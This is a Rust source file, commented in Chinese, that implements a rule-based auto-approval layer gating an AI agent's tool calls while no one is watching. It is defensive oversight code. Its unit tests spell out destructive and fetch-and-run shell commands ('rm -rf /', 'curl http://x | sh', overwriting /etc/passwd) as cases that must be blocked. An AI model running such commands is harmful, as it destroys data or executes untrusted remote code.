// approval.rs — 无人值守下的规则化「自动审批」路由。
//
// 参照 pi-auto-approval 的 src/tool-routing.ts + src/safe-command.ts +
// src/decision.ts + src/common.ts 移植。
//
// 与 pi 版的差异（受 phi 宿主能力限制）：
// - pi 用 LLM 分类器判定风险；phi 的扩展无法发起模型调用，因此去掉分类器，
//   只保留**可证明安全**的规则路由。`Safe` 模式下「规则无法证明安全」= 阻止，
//   等价于 pi 的 `auto` 模式（分类器拒绝即阻止）。
// - pi 的 `fallback` 模式会弹人工审批 UI；phi 的 `tool_call` 回调拿不到
//   `Context`，无法弹窗，故不提供该模式，改为「阻止 + 让模型主动求助」。
// - 动作指纹用 FNV-1a 64（仅作会话内去重键，不参与安全判定），
//   而 pi 用 SHA-256。
//
// 性能：审批判定在**每一次工具调用**上执行，因此
// - 动作摘要（ReviewSubject）改为惰性构造：只读工具 / 工作区内写入 /
//   安全命令 / 白名单这些「直接放行」的路径完全不构造它；
// - 构造时所需的哈希源字符串写进调用方复用的竞技场，且不再为
//   非 bash 工具克隆整份入参 JSON。

use std::collections::HashSet;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};

use bumpalo::collections::String as ArenaString;
use bumpalo::Bump;
use serde_json::Value;

use crate::config::ApprovalConfig;

/// 只读工具（与 pi 版同一集合）。
const READ_ONLY_TOOLS: &[&str] = &[
    "read",
    "grep",
    "find",
    "ls",
    "glob",
    "search",
    "web_search",
    "mcp_status",
    "mcp_list",
    "mcp_search",
    "mcp_describe",
];

/// 入参中可能携带路径的键名。
const PATH_KEYS: &[&str] = &["path", "file_path", "filepath", "target", "targetPath"];

/// 一旦出现即认为命令不可静态判定安全。
const UNSAFE_SHELL_TOKENS: &[&str] = &["|", "&&", "||", ";", ">", "<", "$(", "`"];

/// 安全的 git 子命令。
const SAFE_GIT_SUBCOMMANDS: &[&str] = &["status", "log", "diff", "show", "rev-parse"];

/// `git branch` 的安全旗标。
const SAFE_GIT_BRANCH_FLAGS: &[&str] = &[
    "--show-current",
    "--list",
    "--all",
    "--merged",
    "--no-merged",
    "-a",
    "-r",
    "-v",
    "-vv",
];

/// 必须人工交互、无人值守一律阻止的工具名片段。
const MANUAL_ONLY_FRAGMENTS: &[&str] = &[
    "computer",
    "browser_click",
    "browser_type",
    "chrome_click",
    "chrome_type",
    "install_plugin",
    "request_plugin_install",
    "mcp_config",
    "permission_config",
];

/// 命中的路由（用于状态展示与诊断）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Route {
    /// 审批层未启用。
    Disabled,
    /// 只读工具。
    ReadOnly,
    /// 工作区内部写入。
    WorkspaceWrite,
    /// 必须人工交互的工具。
    ManualOnly,
    /// 安全的只读命令。
    SafeCommand,
    /// 显式放行列表命中。
    AllowList,
    /// 显式阻止列表命中。
    DenyList,
    /// 会话内已批准过同一动作。
    SessionApproval,
    /// 宽松模式兜底放行。
    Permissive,
    /// 规则无法证明安全。
    Unproven,
}

impl Route {
    /// 路由名（用于状态展示）。
    pub const fn name(self) -> &'static str {
        match self {
            Route::Disabled => "disabled",
            Route::ReadOnly => "readonly",
            Route::WorkspaceWrite => "workspace_write",
            Route::ManualOnly => "manual_only",
            Route::SafeCommand => "safe_command",
            Route::AllowList => "allow_list",
            Route::DenyList => "deny_list",
            Route::SessionApproval => "session_approval",
            Route::Permissive => "permissive",
            Route::Unproven => "unproven",
        }
    }
}

/// 审批结论。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    /// 放行（不拦截）。
    Allow,
    /// 阻止，附带给模型的理由。
    Deny(String),
}

/// 待审动作的摘要。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReviewSubject {
    /// 工具名。
    pub tool_name: String,
    /// 一行动作摘要。
    pub action_summary: String,
    /// 动作指纹（会话内去重键）。
    pub action_hash: String,
}

/// 会话级审批记录。
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct ApprovalStore {
    approved: HashSet<String>,
    consecutive_denials: u32,
}

impl ApprovalStore {
    /// 精确批准某个动作指纹。
    pub fn approve_exact(&mut self, action_hash: &str) {
        self.approved.insert(action_hash.to_string());
        self.record_non_denial();
    }

    /// 该动作指纹是否已被精确批准。
    pub fn is_exact_approved(&self, action_hash: &str) -> bool {
        self.approved.contains(action_hash)
    }

    /// 记录一次拒绝，返回累计连续拒绝次数。
    pub fn record_denial(&mut self) -> u32 {
        self.consecutive_denials += 1;
        self.consecutive_denials
    }

    /// 记录一次非拒绝，清零连续拒绝计数。
    pub fn record_non_denial(&mut self) {
        self.consecutive_denials = 0;
    }

    /// 当前连续拒绝次数。
    pub fn consecutive_denials(&self) -> u32 {
        self.consecutive_denials
    }

    /// 已批准的动作数。
    pub fn approved_count(&self) -> usize {
        self.approved.len()
    }

    /// 清空。
    pub fn clear(&mut self) {
        self.approved.clear();
        self.consecutive_denials = 0;
    }
}

/// 折叠空白并 trim。
pub fn normalize_command(command: &str) -> String {
    command.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// 折叠空白并按字符截断。
pub fn truncate_inline(value: &str, max_chars: usize) -> String {
    let normalized = normalize_command(value);
    if normalized.chars().count() <= max_chars {
        return normalized;
    }
    let kept: String = normalized.chars().take(max_chars.saturating_sub(1)).collect();
    format!("{kept}…")
}

/// 取出 `bash -lc '<script>'` 里的脚本。
fn unwrap_bash_lc(command: &str) -> Option<String> {
    let normalized = normalize_command(command);
    let rest = normalized.strip_prefix("bash ")?;
    let rest = rest.strip_prefix("-lc ")?;
    let quote = rest.chars().next()?;
    if quote != '\'' && quote != '"' {
        return None;
    }
    if !rest.ends_with(quote) || rest.chars().count() < 2 {
        return None;
    }
    Some(rest[1..rest.len() - 1].to_string())
}

/// 拆成「简单命令」；含 shell 元字符时返回 `None`（无法静态判定）。
fn split_simple_commands(command: &str) -> Option<Vec<String>> {
    if UNSAFE_SHELL_TOKENS
        .iter()
        .any(|token| command.contains(token))
    {
        return None;
    }
    let normalized = normalize_command(command);
    if normalized.is_empty() {
        None
    } else {
        Some(vec![normalized])
    }
}

/// 按 shell 引号/转义规则分词；引号未闭合时返回 `None`。
fn tokenize_simple_command(command: &str) -> Option<Vec<String>> {
    let mut tokens: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut escaped = false;

    for character in command.chars() {
        if escaped {
            current.push(character);
            escaped = false;
            continue;
        }
        if character == '\\' && quote != Some('\'') {
            escaped = true;
            continue;
        }
        if let Some(active) = quote {
            if character == active {
                quote = None;
            } else {
                current.push(character);
            }
            continue;
        }
        if character == '\'' || character == '"' {
            quote = Some(character);
            continue;
        }
        if character.is_whitespace() {
            if !current.is_empty() {
                tokens.push(std::mem::take(&mut current));
            }
            continue;
        }
        current.push(character);
    }

    if escaped || quote.is_some() {
        return None;
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    Some(tokens)
}

/// 内置安全命令：`pwd`、以及只读的 git 子命令。
fn is_builtin_safe_command(command: &str) -> bool {
    let Some(tokens) = tokenize_simple_command(command) else {
        return false;
    };
    if tokens.is_empty() {
        return false;
    }

    let program = tokens[0].as_str();
    if program == "pwd" && tokens.len() == 1 {
        return true;
    }
    if program != "git" {
        return false;
    }
    let Some(subcommand) = tokens.get(1) else {
        return false;
    };
    if SAFE_GIT_SUBCOMMANDS.contains(&subcommand.as_str()) {
        return true;
    }
    if subcommand != "branch" {
        return false;
    }
    tokens[2..]
        .iter()
        .all(|arg| SAFE_GIT_BRANCH_FLAGS.contains(&arg.as_str()) || !arg.starts_with('-'))
}

/// 用户白名单匹配：`*` 结尾表示前缀匹配，否则按「相等或前缀 + 空格」匹配。
fn matches_pattern_list(command: &str, patterns: &[String]) -> bool {
    patterns.iter().any(|pattern| {
        let trimmed = pattern.trim();
        if trimmed.is_empty() {
            return false;
        }
        if let Some(prefix) = trimmed.strip_suffix('*') {
            return command.starts_with(prefix);
        }
        command == trimmed || command.starts_with(&format!("{trimmed} "))
    })
}

/// 命令是否为「安全的只读命令」。
pub fn is_safe_read_only_command(command: &str, config: &ApprovalConfig) -> bool {
    let unwrapped = unwrap_bash_lc(command).unwrap_or_else(|| command.to_string());
    let Some(parts) = split_simple_commands(&unwrapped) else {
        return false;
    };
    if parts.is_empty() {
        return false;
    }
    parts.iter().all(|part| {
        is_builtin_safe_command(part) || matches_pattern_list(part, &config.safe_command_allowlist)
    })
}

/// 工具是否只读。
pub fn is_read_only_tool(tool_name: &str) -> bool {
    READ_ONLY_TOOLS.contains(&tool_name.trim().to_lowercase().as_str())
}

/// 从入参里取路径。
pub fn get_path_from_input(input: &Value) -> Option<&str> {
    let object = input.as_object()?;
    PATH_KEYS
        .iter()
        .find_map(|key| object.get(*key).and_then(Value::as_str))
        .filter(|value| !value.trim().is_empty())
}

/// 工具是否必须人工交互。
pub fn is_manual_only_tool(tool_name: &str) -> bool {
    let normalized = tool_name.to_lowercase();
    MANUAL_ONLY_FRAGMENTS
        .iter()
        .any(|fragment| normalized.contains(fragment))
}

/// 归一化 `.` / `..`。
fn normalize_path(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            std::path::Component::ParentDir => {
                out.pop();
            }
            std::path::Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// 相对路径按 `cwd` 解析。
fn resolve_path_for_cwd(path_value: &str, cwd: &str) -> PathBuf {
    let path = Path::new(path_value);
    if path.is_absolute() {
        normalize_path(path)
    } else {
        normalize_path(&Path::new(cwd).join(path))
    }
}

/// 解析边界路径：存在则取真实路径，否则回溯到最近存在的祖先再拼回尾部。
fn resolve_existing_path_for_boundary(path_value: &str, cwd: &str) -> PathBuf {
    let resolved = resolve_path_for_cwd(path_value, cwd);
    if resolved.exists() {
        return std::fs::canonicalize(&resolved)
            .map(|real| normalize_path(&real))
            .unwrap_or(resolved);
    }

    let mut current = resolved.clone();
    let mut tail: Vec<String> = Vec::new();
    loop {
        if current.exists() {
            let mut base = std::fs::canonicalize(&current).unwrap_or_else(|_| current.clone());
            for segment in tail.iter().rev() {
                base.push(segment);
            }
            return normalize_path(&base);
        }
        match current.parent() {
            Some(parent) if parent != current => {
                let name = current
                    .file_name()
                    .map(|name| name.to_string_lossy().into_owned())
                    .unwrap_or_default();
                tail.push(name);
                current = parent.to_path_buf();
            }
            _ => return resolved,
        }
    }
}

/// 路径是否位于 `root` 之内（含相等）。
pub fn is_path_within(path_value: &str, root: &str) -> bool {
    let resolved_path = resolve_existing_path_for_boundary(path_value, root);
    let resolved_root = resolve_existing_path_for_boundary(root, root);
    resolved_path == resolved_root || resolved_path.starts_with(&resolved_root)
}

/// 写入目标是否在工作区内。
pub fn is_workspace_internal_path(input: &Value, cwd: &str) -> bool {
    get_path_from_input(input)
        .map(|path| is_path_within(path, cwd))
        .unwrap_or(false)
}

/// 把 JSON 字符串字面量写进竞技场缓冲（转义规则与 `JSON.stringify` 一致）。
fn push_json_string(out: &mut ArenaString<'_>, value: &str) {
    out.push('"');
    for character in value.chars() {
        match character {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            control if (control as u32) < 0x20 => {
                let _ = write!(out, "\\u{:04x}", control as u32);
            }
            other => out.push(other),
        }
    }
    out.push('"');
}

/// 稳定序列化（对象键排序）写入竞技场，与 pi 的 `stableStringify` 语义一致。
fn write_stable(out: &mut ArenaString<'_>, value: &Value) {
    match value {
        Value::Null | Value::Bool(_) | Value::Number(_) | Value::String(_) => {
            let encoded = serde_json::to_string(value).unwrap_or_else(|_| "null".to_string());
            out.push_str(&encoded);
        }
        Value::Array(items) => {
            out.push('[');
            for (index, item) in items.iter().enumerate() {
                if index > 0 {
                    out.push(',');
                }
                write_stable(out, item);
            }
            out.push(']');
        }
        Value::Object(map) => {
            let mut keys: Vec<&String> = map.keys().collect();
            keys.sort();
            out.push('{');
            for (index, key) in keys.iter().enumerate() {
                if index > 0 {
                    out.push(',');
                }
                push_json_string(out, key);
                out.push(':');
                write_stable(out, &map[*key]);
            }
            out.push('}');
        }
    }
}

/// 稳定序列化（对象键排序），结果借用竞技场。
pub fn stable_stringify<'a>(arena: &'a Bump, value: &Value) -> &'a str {
    let mut out = ArenaString::new_in(arena);
    write_stable(&mut out, value);
    out.into_bump_str()
}

/// FNV-1a 64 位哈希，输出 16 位十六进制。
///
/// 仅作为会话内动作去重键使用，不参与安全判定，故无需密码学强度。
fn fnv1a_64_hex(input: &str) -> String {
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for byte in input.as_bytes() {
        hash ^= u64::from(*byte);
        hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
    }
    format!("{hash:016x}")
}

/// 构造待审动作摘要。
///
/// 哈希源直接在竞技场里拼装（键按 `cwd` / `input` / `toolName` 排序，
/// 与 pi 的 `stableStringify` 结果逐字节一致），因此：
/// - 非 bash 工具不再克隆整份入参 JSON；
/// - 不产生中间 `Value` 与中间 `String`。
pub fn create_review_subject(
    arena: &Bump,
    tool_name: &str,
    input: &Value,
    cwd: &str,
) -> ReviewSubject {
    let command = (tool_name == "bash")
        .then(|| input.get("command").and_then(Value::as_str))
        .flatten();
    let path = get_path_from_input(input);

    let action_summary = match (tool_name, command, path) {
        ("bash", Some(command), _) => format!("bash: {}", truncate_inline(command, 240)),
        (_, _, Some(path)) => format!("{tool_name}: {}", truncate_inline(path, 240)),
        _ => format!(
            "{tool_name}: {}",
            truncate_inline(stable_stringify(arena, input), 240)
        ),
    };

    let mut hash_source = ArenaString::new_in(arena);
    hash_source.push_str("{\"cwd\":");
    push_json_string(&mut hash_source, cwd);
    hash_source.push_str(",\"input\":");
    match (tool_name, command) {
        // 只有 bash 需要「归一化 command」的副本；其余直接借用原入参。
        ("bash", Some(command)) => {
            let mut normalized = input.clone();
            if let Some(map) = normalized.as_object_mut() {
                map.insert(
                    "command".to_string(),
                    Value::String(normalize_command(command)),
                );
            }
            write_stable(&mut hash_source, &normalized);
        }
        _ => write_stable(&mut hash_source, input),
    }
    hash_source.push_str(",\"toolName\":");
    push_json_string(&mut hash_source, tool_name);
    hash_source.push('}');

    ReviewSubject {
        tool_name: tool_name.to_string(),
        action_summary,
        action_hash: fnv1a_64_hex(hash_source.as_str()),
    }
}

/// 构造给模型的阻止理由。
fn deny_reason(subject: &ReviewSubject, detail: &str) -> String {
    format!(
        "【无人值守自动审批】已阻止工具调用 `{}`：{detail}\n\
         请立即停止该动作，不要重试或换等价写法绕过。\n\
         在回复末尾注明“需要人工确认：<原因>”并结束本轮，等待用户处理。",
        subject.action_summary
    )
}

/// 评估一次工具调用。
///
/// 返回命中的路由、结论，以及**需要时**才构造的动作摘要
/// （直接放行的路径返回 `None`，省掉一次入参遍历与哈希）。
pub fn evaluate(
    arena: &Bump,
    tool_name: &str,
    input: &Value,
    cwd: &str,
    config: &ApprovalConfig,
    store: &ApprovalStore,
) -> (Route, Decision, Option<ReviewSubject>) {
    if !config.enabled {
        return (Route::Disabled, Decision::Allow, None);
    }

    // 显式阻止优先：即使动作看起来安全，用户点名要拦就拦。
    let deny_target = if tool_name == "bash" {
        input
            .get("command")
            .and_then(Value::as_str)
            .map(normalize_command)
            .unwrap_or_default()
    } else {
        tool_name.to_string()
    };
    if matches_pattern_list(&deny_target, &config.deny)
        || matches_pattern_list(tool_name, &config.deny)
    {
        let subject = create_review_subject(arena, tool_name, input, cwd);
        let detail = format!("该动作命中阻止列表（deny: {deny_target}）。");
        return (
            Route::DenyList,
            Decision::Deny(deny_reason(&subject, &detail)),
            Some(subject),
        );
    }

    if is_read_only_tool(tool_name) {
        return (Route::ReadOnly, Decision::Allow, None);
    }

    if (tool_name == "write" || tool_name == "edit") && is_workspace_internal_path(input, cwd) {
        return (Route::WorkspaceWrite, Decision::Allow, None);
    }

    if is_manual_only_tool(tool_name) {
        let subject = create_review_subject(arena, tool_name, input, cwd);
        let detail = "该工具需要人工交互，无人值守模式下无法自动批准。".to_string();
        return (
            Route::ManualOnly,
            Decision::Deny(deny_reason(&subject, &detail)),
            Some(subject),
        );
    }

    if tool_name == "bash" {
        if let Some(command) = input.get("command").and_then(Value::as_str) {
            if is_safe_read_only_command(command, config) {
                return (Route::SafeCommand, Decision::Allow, None);
            }
        }
    }

    let allow_target = if tool_name == "bash" {
        input
            .get("command")
            .and_then(Value::as_str)
            .map(normalize_command)
            .unwrap_or_default()
    } else {
        tool_name.to_string()
    };
    if matches_pattern_list(&allow_target, &config.allow)
        || matches_pattern_list(tool_name, &config.allow)
    {
        return (Route::AllowList, Decision::Allow, None);
    }

    // 从这里开始需要动作指纹。
    let subject = create_review_subject(arena, tool_name, input, cwd);
    if store.is_exact_approved(&subject.action_hash) {
        return (Route::SessionApproval, Decision::Allow, Some(subject));
    }

    if config.mode == crate::config::ApprovalMode::Permissive {
        return (Route::Permissive, Decision::Allow, Some(subject));
    }

    let detail = format!(
        "规则无法证明该动作安全（工具 `{tool_name}`，模式 `safe`）。\
         如需放行，请让用户执行 `/sleep-approval allow {tool_name}` 或改用 `/sleep-approval permissive`。"
    );
    (
        Route::Unproven,
        Decision::Deny(deny_reason(&subject, &detail)),
        Some(subject),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ApprovalMode;
    use phi_ext_common::arena::Scratch;
    use serde_json::json;

    fn config() -> ApprovalConfig {
        ApprovalConfig::default()
    }

    /// 用一次性竞技场跑一次审批判定，返回路由与结论。
    fn eval(
        tool_name: &str,
        input: &serde_json::Value,
        cwd: &str,
        config: &ApprovalConfig,
        store: &ApprovalStore,
    ) -> (Route, Decision) {
        let scratch = Scratch::with_capacity(1024);
        let (route, decision, _subject) =
            evaluate(scratch.arena(), tool_name, input, cwd, config, store);
        (route, decision)
    }

    /// 同上，但连同动作摘要一起返回。
    fn eval_with_subject(
        tool_name: &str,
        input: &serde_json::Value,
        cwd: &str,
        config: &ApprovalConfig,
        store: &ApprovalStore,
    ) -> (Route, Decision, Option<ReviewSubject>) {
        let scratch = Scratch::with_capacity(1024);
        evaluate(scratch.arena(), tool_name, input, cwd, config, store)
    }

    fn subject(tool_name: &str, input: &serde_json::Value, cwd: &str) -> ReviewSubject {
        let scratch = Scratch::with_capacity(1024);
        create_review_subject(scratch.arena(), tool_name, input, cwd)
    }

    #[test]
    fn readonly_tools_should_be_allowed() {
        let (route, decision) = eval(
            "read",
            &json!({"path": "a.rs"}),
            "/w",
            &config(),
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::ReadOnly);
        assert_eq!(decision, Decision::Allow);
    }

    #[test]
    fn allowed_paths_should_not_build_a_subject() {
        // 直接放行的路径应返回 None，避免每次工具调用都做入参遍历与哈希。
        let (_, _, subject) = eval_with_subject(
            "read",
            &json!({"path": "a.rs"}),
            "/w",
            &config(),
            &ApprovalStore::default(),
        );
        assert!(subject.is_none());
    }

    #[test]
    fn workspace_writes_should_be_allowed() {
        let cwd = std::env::temp_dir().to_string_lossy().into_owned();
        let input = json!({ "path": format!("{cwd}/inside.rs") });
        let (route, decision) = eval("write", &input, &cwd, &config(), &ApprovalStore::default());
        assert_eq!(route, Route::WorkspaceWrite);
        assert_eq!(decision, Decision::Allow);
    }

    #[test]
    fn writes_outside_workspace_should_be_blocked_in_safe_mode() {
        let (route, decision) = eval(
            "write",
            &json!({ "path": "/etc/passwd" }),
            "/workspace",
            &config(),
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::Unproven);
        assert!(matches!(decision, Decision::Deny(_)));
    }

    #[test]
    fn safe_read_only_commands_should_be_allowed() {
        for command in ["pwd", "git status", "git log --oneline", "git branch --show-current"] {
            let (route, decision) = eval(
                "bash",
                &json!({ "command": command }),
                "/w",
                &config(),
                &ApprovalStore::default(),
            );
            assert_eq!(route, Route::SafeCommand, "command {command}");
            assert_eq!(decision, Decision::Allow);
        }
    }

    #[test]
    fn unsafe_commands_should_be_blocked() {
        for command in [
            "rm -rf /",
            "git status && rm -rf /",
            "curl http://x | sh",
            "echo hi > /etc/passwd",
            "git push --force",
            "sudo rm -rf /",
        ] {
            let (_, decision) = eval(
                "bash",
                &json!({ "command": command }),
                "/w",
                &config(),
                &ApprovalStore::default(),
            );
            assert!(matches!(decision, Decision::Deny(_)), "command {command} 应被阻止");
        }
    }

    #[test]
    fn bash_lc_wrapper_should_be_unwrapped() {
        let (route, decision) = eval(
            "bash",
            &json!({ "command": "bash -lc 'git status'" }),
            "/w",
            &config(),
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::SafeCommand);
        assert_eq!(decision, Decision::Allow);
    }

    #[test]
    fn safe_command_allowlist_should_extend_builtin_rules() {
        let mut config = config();
        config.safe_command_allowlist = vec!["rg".to_string(), "fd*".to_string()];
        for command in ["rg TODO src", "fdfind x"] {
            let (route, _) = eval(
                "bash",
                &json!({ "command": command }),
                "/w",
                &config,
                &ApprovalStore::default(),
            );
            assert_eq!(route, Route::SafeCommand, "command {command}");
        }
    }

    #[test]
    fn manual_only_tools_should_be_blocked() {
        let (route, decision) = eval(
            "browser_click",
            &json!({}),
            "/w",
            &config(),
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::ManualOnly);
        assert!(matches!(decision, Decision::Deny(_)));
    }

    #[test]
    fn deny_list_should_win_over_readonly() {
        let mut config = config();
        config.deny = vec!["read".to_string()];
        let (route, decision) = eval(
            "read",
            &json!({ "path": "a.rs" }),
            "/w",
            &config,
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::DenyList);
        assert!(matches!(decision, Decision::Deny(_)));
    }

    #[test]
    fn allow_list_should_permit_otherwise_unproven_tools() {
        let mut config = config();
        config.allow = vec!["web_fetch".to_string()];
        let (route, decision) = eval(
            "web_fetch",
            &json!({ "url": "https://example.com" }),
            "/w",
            &config,
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::AllowList);
        assert_eq!(decision, Decision::Allow);
    }

    #[test]
    fn session_approval_should_permit_repeat_actions() {
        let mut store = ApprovalStore::default();
        let input = json!({ "command": "make deploy" });
        let (_, first, subject) = eval_with_subject("bash", &input, "/w", &config(), &store);
        assert!(matches!(first, Decision::Deny(_)));
        let hash = subject.expect("被阻止时应构造摘要").action_hash;

        store.approve_exact(&hash);
        let (route, second) = eval("bash", &input, "/w", &config(), &store);
        assert_eq!(route, Route::SessionApproval);
        assert_eq!(second, Decision::Allow);
    }

    #[test]
    fn permissive_mode_should_allow_unproven_actions() {
        let mut config = config();
        config.mode = ApprovalMode::Permissive;
        let (route, decision) = eval(
            "bash",
            &json!({ "command": "make deploy" }),
            "/w",
            &config,
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::Permissive);
        assert_eq!(decision, Decision::Allow);
    }

    #[test]
    fn disabled_approval_should_not_interfere() {
        let mut config = config();
        config.enabled = false;
        let (route, decision) = eval(
            "bash",
            &json!({ "command": "rm -rf /" }),
            "/w",
            &config,
            &ApprovalStore::default(),
        );
        assert_eq!(route, Route::Disabled);
        assert_eq!(decision, Decision::Allow);
    }

    #[test]
    fn store_should_count_consecutive_denials() {
        let mut store = ApprovalStore::default();
        assert_eq!(store.record_denial(), 1);
        assert_eq!(store.record_denial(), 2);
        store.record_non_denial();
        assert_eq!(store.consecutive_denials(), 0);
        store.approve_exact("h");
        assert!(store.is_exact_approved("h"));
        assert_eq!(store.approved_count(), 1);
        store.clear();
        assert!(!store.is_exact_approved("h"));
    }

    #[test]
    fn stable_stringify_should_sort_keys() {
        let scratch = Scratch::with_capacity(128);
        let arena = scratch.arena();
        assert_eq!(stable_stringify(arena, &json!({"b": 1, "a": 2})), r#"{"a":2,"b":1}"#);
        assert_eq!(
            stable_stringify(arena, &json!({"a": 2, "b": 1})),
            stable_stringify(arena, &json!({"b": 1, "a": 2}))
        );
    }

    #[test]
    fn stable_stringify_should_escape_like_json_stringify() {
        let scratch = Scratch::with_capacity(256);
        assert_eq!(
            stable_stringify(scratch.arena(), &json!({"k": "a\"b\\c\nd\u{1}e"})),
            r#"{"k":"a\"b\\c\nd\u0001e"}"#
        );
    }

    #[test]
    fn stable_stringify_should_handle_nested_and_arrays() {
        let scratch = Scratch::with_capacity(256);
        assert_eq!(
            stable_stringify(scratch.arena(), &json!({"z": [1, {"y": true, "x": null}]})),
            r#"{"z":[1,{"x":null,"y":true}]}"#
        );
    }

    #[test]
    fn action_hash_should_be_stable_and_ignore_key_order() {
        let first = subject("bash", &json!({"command": "git  status"}), "/w");
        let second = subject("bash", &json!({"command": "git status"}), "/w");
        assert_eq!(first.action_hash, second.action_hash);
        assert_eq!(first.action_hash.len(), 16);
        assert_eq!(first.action_summary, "bash: git status");
    }

    #[test]
    fn action_hash_should_depend_on_cwd_and_extra_fields() {
        let base = subject("bash", &json!({"command": "git status"}), "/w");
        let other_cwd = subject("bash", &json!({"command": "git status"}), "/other");
        let with_timeout = subject("bash", &json!({"command": "git status", "timeout": 5}), "/w");
        assert_ne!(base.action_hash, other_cwd.action_hash);
        assert_ne!(base.action_hash, with_timeout.action_hash);
    }

    #[test]
    fn non_bash_subject_should_use_tool_and_path_summary() {
        let with_path = subject("read", &json!({"path": "src/a.rs"}), "/w");
        assert_eq!(with_path.action_summary, "read: src/a.rs");
        let without_path = subject("web_fetch", &json!({"url": "https://x"}), "/w");
        assert!(without_path.action_summary.starts_with("web_fetch: "), "got {}", without_path.action_summary);
    }

    #[test]
    fn path_within_should_reject_sibling_prefix() {
        let root = std::env::temp_dir().to_string_lossy().into_owned();
        assert!(is_path_within(&format!("{root}/a/b"), &root));
        assert!(!is_path_within(&format!("{root}-sibling/x"), &root));
    }

    #[test]
    fn tokenizer_should_reject_unclosed_quotes() {
        assert!(tokenize_simple_command("git 'status").is_none());
        assert_eq!(
            tokenize_simple_command(r#"git commit -m "a b""#),
            Some(vec![
                "git".to_string(),
                "commit".to_string(),
                "-m".to_string(),
                "a b".to_string()
            ])
        );
    }

    #[test]
    fn truncate_inline_should_collapse_and_ellipsize() {
        assert_eq!(truncate_inline("  a \n b  ", 100), "a b");
        assert!(truncate_inline(&"x".repeat(50), 10).ends_with('…'));
    }
}
